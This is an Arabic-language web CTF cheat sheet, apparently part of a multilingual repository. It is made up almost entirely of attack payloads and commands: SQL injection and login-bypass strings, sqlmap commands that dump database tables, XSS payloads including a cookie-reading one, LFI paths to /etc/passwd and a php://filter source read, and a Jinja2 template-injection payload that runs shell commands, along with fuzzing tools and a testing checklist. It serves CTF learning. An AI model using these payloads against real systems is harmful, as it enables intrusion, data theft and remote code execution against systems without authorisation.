<a id="-web-ctf-cheatsheet"></a>
# 🌐 مرجع تحديات الويب في CTF

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Web-CTF.tr.md) • [🇬🇷 Ελληνικά](Web-CTF.el.md)

---

<a id="-sql-injection"></a>
## 💉 حقن SQL

<a id="basic-payloads"></a>
### حمولات أساسية
```sql
' OR 1=1--
' OR '1'='1
" OR ""="
admin'--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
```

<a id="sqlmap"></a>
### SQLMap
```bash
sqlmap -u "http://url?id=1" --dbs
sqlmap -u "http://url?id=1" -D dbname --tables
sqlmap -u "http://url?id=1" -D dbname -T users --dump
```

---

<a id="-xss-cross-site-scripting"></a>
## 📜 البرمجة النصية عبر المواقع (XSS)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
```

---

<a id="-lfi-local-file-inclusion"></a>
## 📁 تضمين الملفات المحلية (LFI)

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

---

<a id="-ssti-server-side-template-injection"></a>
## 🔧 حقن القوالب من جهة الخادم (SSTI)

<a id="detection"></a>
### الكشف
```
{{7*7}}     → 49 (Jinja2/Twig)
${7*7}      → 49 (Freemarker)
<%= 7*7 %>  → 49 (ERB)
```

<a id="jinja2-rce"></a>
### تنفيذ شيفرة عن بُعد عبر Jinja2
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

<a id="-authentication-bypass"></a>
## 🔐 تجاوز المصادقة

```
admin' --
admin'/*
' OR 1=1 LIMIT 1--
Password: ' OR '1'='1
```

---

<a id="-cookiejwt"></a>
## 🍪 ملفات الارتباط ورموز JWT

```bash
# فك ترميز JWT
echo "eyJ..." | base64 -d

# الأدوات
jwt_tool.py token
jwt.io (online)
```

---

<a id="-useful-tools"></a>
## 🛠️ أدوات مفيدة

```bash
# تخمين أسماء المجلدات
gobuster dir -u http://url -w wordlist.txt

# تجربة مدخلات متنوعة (Fuzzing)
ffuf -u http://url/FUZZ -w wordlist.txt

# اكتشاف المعاملات
arjun -u http://url
```

---

<a id="-web-ctf-checklist"></a>
## 📋 قائمة تحديات الويب

```markdown
□ فحص شيفرة الصفحة (Ctrl+U)
□ فحص robots.txt وsitemap.xml
□ فحص ملفات الارتباط ورموز JWT
□ اختبار حقن SQL في المدخلات
□ اختبار XSS في المدخلات
□ اختبار LFI في معاملات الملفات
□ البحث عن SSTI
□ تخمين أسماء المجلدات
□ البحث عن مجلد .git مكشوف
```

---

**العودة إلى CTF:** [🏁 نظرة عامة على CTF](README.ar.md)

> **تصحيح بشأن JWT:** الرمز سلسلة أجزاء تفصلها نقاط، وتُستخدم base64url لترميز الأجزاء. لذلك فإن تمرير رمز كامل أو النص المقتطع `eyJ...` إلى `base64 -d` ليس طريقة عامة صحيحة لفك JWT؛ وفك الترميز وحده ليس تحققًا من التوقيع. راجع [RFC 7519](https://www.rfc-editor.org/rfc/rfc7519.html#section-3). تعتمد صلاحية حمولات الويب الأخرى على محرك القوالب وقاعدة البيانات والإصدار وسياق الإدخال؛ القيم المعروضة أمثلة وليست ضمانًا لنتيجة موحدة.
